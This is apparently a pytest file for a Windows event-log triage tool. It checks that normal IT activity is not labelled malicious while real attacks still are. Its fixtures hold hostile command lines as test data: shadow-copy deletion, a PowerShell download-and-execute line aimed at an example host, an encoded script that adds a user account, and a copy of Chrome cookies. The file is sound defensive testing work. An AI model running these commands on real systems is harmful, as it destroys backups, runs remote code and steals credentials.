"""Milestone 5: normal IT activity must not be Malicious, and real attacks still are.
Every name here is made up (agent.exe, PC01, analyst, example domains)."""

from tests.fixtures.events import USER, attack_events, event
from triage.checks import make_verdict, run_checks

SYS = "C:\\Windows\\System32\\"
PS = SYS + "WindowsPowerShell\\v1.0\\powershell.exe"
AGENT = "C:\\Program Files\\Example RMM\\agent.exe"


def checks_fired(events):
    return {f["check"] for f in run_checks(events)}


def strengths(events, check):
    return [f["strength"] for f in run_checks(events) if f["check"] == check]


def recon_from(launcher, middle=("cmd.exe",)):
    """launcher -> each shell in middle -> whoami + ipconfig, 1 second apart."""
    events = [event(1, 1, "2026-02-01 09:00:00.000", ProcessGuid="{l}", Image=launcher,
                    ParentProcessGuid="{root}", ParentImage="C:\\Windows\\explorer.exe")]
    parent_guid, parent_image = "{l}", launcher
    for n, shell in enumerate(middle, start=2):
        guid = "{s%d}" % n
        events.append(event(n, 1, "2026-02-01 09:00:00.500", ProcessGuid=guid, Image=SYS + shell,
                            ParentProcessGuid=parent_guid, ParentImage=parent_image))
        parent_guid, parent_image = guid, SYS + shell
    for n, tool in enumerate(["whoami.exe", "ipconfig.exe"], start=10):
        events.append(event(n, 1, f"2026-02-01 09:00:0{n - 9}.000", ProcessGuid="{t%d}" % n,
                            Image=SYS + tool, ParentProcessGuid=parent_guid, ParentImage=parent_image))
    return events


# ---------- 1a: recon ----------

def test_recon_typed_in_windows_terminal_is_not_a_burst():
    terminal = USER + "\\AppData\\Local\\Microsoft\\WindowsApps\\WindowsTerminal.exe"
    assert "recon_burst" not in checks_fired(recon_from(terminal, middle=("powershell.exe",)))


def test_recon_from_a_shell_opened_before_the_log_is_not_a_burst():
    # Only the two tools are in the log; the cmd.exe window that ran them started earlier.
    tools_only = [e for e in recon_from(AGENT) if e["record_id"] >= 10]
    assert "recon_burst" not in checks_fired(tools_only)


def test_rmm_tool_plus_recon_alone_is_suspicious_not_malicious():
    # The acceptance test: a signed remote-management agent runs recon through two shells.
    events = recon_from(AGENT, middle=("cmd.exe", "powershell.exe"))
    findings = run_checks(events)
    recon = [f for f in findings if f["check"] == "recon_burst"]
    assert recon[0]["process"] == AGENT              # walked up past both shells
    assert recon[0]["strength"] == "Weak" and "dual-use" in recon[0]["detail"]
    assert make_verdict(findings)["label"] == "Suspicious"


def test_dual_use_finding_backed_by_a_high_finding_stays_strong():
    # The same agent also deletes the backups (no legitimate use): now the recon is High too.
    events = recon_from(AGENT) + [
        event(20, 1, "2026-02-01 09:00:05.000", ProcessGuid="{v}", ParentProcessGuid="{l}",
              Image=SYS + "vssadmin.exe", ParentImage=AGENT, CommandLine="vssadmin delete shadows /all /quiet")]
    assert strengths(events, "recon_burst") == ["Strong"]


def test_two_dual_use_findings_do_not_back_each_other_up():
    events = recon_from(AGENT) + [
        event(20, 1, "2026-02-01 09:00:05.000", ProcessGuid="{p}", ParentProcessGuid="{l}", Image=PS,
              ParentImage=AGENT, CommandLine="powershell -c iex (iwr https://scripts.example.com/a.ps1)")]
    assert make_verdict(run_checks(events))["label"] == "Suspicious"


def test_recon_by_a_downloaded_program_stays_malicious():
    events = recon_from(USER + "\\Downloads\\setup.exe")
    assert strengths(events, "recon_burst") == ["Strong"]
    assert make_verdict(run_checks(events))["label"] == "Malicious"


# ---------- 1b: lookalike ----------

def test_brand_owned_domain_is_not_a_lookalike():
    teams = USER + "\\AppData\\Local\\Microsoft\\Teams\\ms-teams.exe"
    events = [event(1, 22, "2026-02-01 09:00:00.000", Image=teams, QueryName="teams.cloud.microsoft"),
              event(2, 22, "2026-02-01 09:00:01.000", Image=teams, QueryName="cloud.microsoft")]
    assert run_checks(events) == []


# ---------- 1c: services ----------

def service(path, record=1):
    """A file is created during the log, then a service is set to run it."""
    return [event(record, 11, "2026-02-01 09:00:00.000", ProcessGuid="{i}", Image=SYS + "msiexec.exe",
                  TargetFilename=path),
            event(record + 1, 13, "2026-02-01 09:00:01.000", ProcessGuid="{svc}", Image=SYS + "services.exe",
                  TargetObject="HKLM\\System\\CurrentControlSet\\Services\\Example\\ImagePath", Details=path)]


def test_defender_platform_and_driver_store_services_are_not_findings():
    defender = "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.1-0\\MsMpEng.exe"
    driver = SYS + "DriverStore\\FileRepository\\example.inf_amd64_1\\exampleservice.exe"
    assert "persistence" not in checks_fired(service(defender))
    assert "persistence" not in checks_fired(service(driver))


def test_fake_updater_service_is_still_strong():
    assert [f["strength"] for f in run_checks(attack_events())
            if f["title"] == "New service from a dropped file"] == ["Strong"]


# ---------- 1d: LSASS ----------

def test_lsass_reader_in_windows_temp_is_strong():
    fake = "C:\\Windows\\Temp\\wininit.exe"
    events = [event(1, 10, "2026-02-01 09:00:00.000", SourceImage=fake, SourceProcessGUID="{f}",
                    TargetImage=SYS + "lsass.exe", GrantedAccess="0x1fffff")]
    assert strengths(events, "lsass_access") == ["Strong"]


# ---------- 5d: document apps ----------

def test_outlook_opening_a_browser_or_open_with_is_not_a_finding():
    outlook = "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE"
    chrome = USER + "\\AppData\\Local\\Google\\Chrome\\Application\\chrome.exe"
    events = [event(1, 1, "2026-02-01 09:00:00.000", ProcessGuid="{c}", Image=chrome, ParentImage=outlook,
                    CommandLine=f'"{chrome}" https://www.example.com/'),
              event(2, 1, "2026-02-01 09:00:01.000", ProcessGuid="{r}", Image=SYS + "rundll32.exe",
                    ParentImage=outlook, CommandLine="rundll32.exe shell32.dll,OpenAs_RunDLL C:\\x\\a.dat")]
    assert "document_app_spawns_program" not in checks_fired(events)
    events.append(event(3, 1, "2026-02-01 09:00:02.000", ProcessGuid="{p}", Image=PS, ParentImage=outlook,
                        CommandLine="powershell -c whoami"))
    assert "document_app_spawns_program" in checks_fired(events)


# ---------- 5c: cookies ----------

def test_deleting_cookies_is_not_theft_but_copying_them_is():
    cookies = USER + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies"
    delete = [event(1, 1, "2026-02-01 09:00:00.000", ProcessGuid="{d}", Image=SYS + "cmd.exe",
                    CommandLine=f'cmd /c del /f "{cookies}"')]
    copy = [event(2, 1, "2026-02-01 09:00:00.000", ProcessGuid="{c}", Image=SYS + "cmd.exe",
                  CommandLine=f'cmd /c copy "{cookies}" C:\\Users\\Public\\c.db')]
    assert "credential_theft" not in checks_fired(delete)
    assert strengths(copy, "credential_theft") == ["Strong"]


# ---------- Block 2: privacy ----------

def test_url_host_drops_user_password_and_port():
    from triage.iocs import url_host
    assert url_host("https://john.doe:Secr3t@evil.example.com:8080/x") == "evil.example.com"
    assert url_host("http://1.2.3.4/a") == "1.2.3.4"
    assert url_host("http://[broken/") == ""


def test_url_with_a_login_gives_the_real_host_as_domain_ioc():
    from triage.iocs import extract_iocs
    events = [event(1, 1, "2026-02-01 09:00:00.000", ProcessGuid="{d}", Image=USER + r"\Downloads\d.exe",
                    CommandLine="d.exe https://john.doe:Secr3t@evil.example.com/x")]
    domains = [i["value"] for i in extract_iocs(events, run_checks(events)) if i["type"] == "domain"]
    assert domains == ["evil.example.com"]


def test_parent_domain_of_the_organisation_stays_private():
    from triage.iocs import check_shareable
    names = {"pc01.ad.contoso.com"}
    assert check_shareable("domain", "vpn.contoso.com", names) != ""
    assert check_shareable("domain", "contoso.com", names) != ""
    assert check_shareable("domain", "evil.com", names) == ""
    # co.uk keeps three labels: other .co.uk companies are still shareable.
    assert check_shareable("domain", "other.co.uk", {"pc01.ad.example.co.uk"}) == ""
    assert check_shareable("domain", "mail.example.co.uk", {"pc01.ad.example.co.uk"}) != ""


def test_password_in_decoded_powershell_is_hidden():
    import base64
    script = "iwr http://x.example/a; net user bob Winter2026! /add"
    command = "powershell -EncodedCommand " + base64.b64encode(script.encode("utf-16-le")).decode()
    events = [event(1, 1, "2026-02-01 09:00:00.000", ProcessGuid="{p}", Image=PS, CommandLine=command)]
    findings = run_checks(events)
    assert findings and all("Winter2026!" not in f["detail"] for f in findings)
    assert "net user bob ****" in findings[0]["detail"]


def test_more_password_forms_are_hidden():
    from triage.parse import hide_secrets
    # r"..." = a raw string: a backslash is just a backslash, as in a Windows command line.
    assert hide_secrets(r"net use \\srv\c$ /user:admin Secret1") == r"net use \\srv\c$ /user:admin ****"
    assert hide_secrets(r"net use z: \\srv\d /user:admin /persistent:no") == \
        r"net use z: \\srv\d /user:admin /persistent:no"           # no password: nothing hidden
    assert hide_secrets(r"7z.exe x a.zip -pSecret1 -oC:\out") == r"7z.exe x a.zip -p**** -oC:\out"
    assert hide_secrets("mysql -u root -pSecret1 -P3306") == "mysql -u root -p**** -P3306"
    assert hide_secrets("tar -pxf a.tar") == "tar -pxf a.tar"         # other tools: -p is not a password
    assert hide_secrets("curl https://bob:Secret1@files.example.com/a") == \
        "curl https://bob:****@files.example.com/a"
    assert hide_secrets("curl -u bob:Secret1 https://x.example.com") == "curl -u bob:**** https://x.example.com"
    assert hide_secrets("Sysmon64.exe -u force") == "Sysmon64.exe -u force"


# ---------- Block 3: encoding does not hide a command from the rule lists ----------

def encoded(script):
    import base64
    return "powershell -NoProfile -EncodedCommand " + base64.b64encode(script.encode("utf-16-le")).decode()


def test_encoded_shadow_copy_deletion_is_strong():
    events = [event(1, 1, "2026-02-01 09:00:00.000", ProcessGuid="{p}", Image=PS,
                    CommandLine=encoded("vssadmin delete shadows /all /quiet"))]
    findings = [f for f in run_checks(events) if f["check"] == "evidence_removal"]
    assert [f["strength"] for f in findings] == ["Strong"]
    assert "decoded command: vssadmin delete shadows" in findings[0]["detail"]


def test_encoded_new_account_is_found_with_the_password_hidden():
    events = [event(1, 1, "2026-02-01 09:00:00.000", ProcessGuid="{p}", Image=PS,
                    CommandLine=encoded("net user bob Winter2026! /add"))]
    findings = run_checks(events)
    assert [f["check"] for f in findings] == ["access_change"]
    assert "Winter2026!" not in findings[0]["detail"]
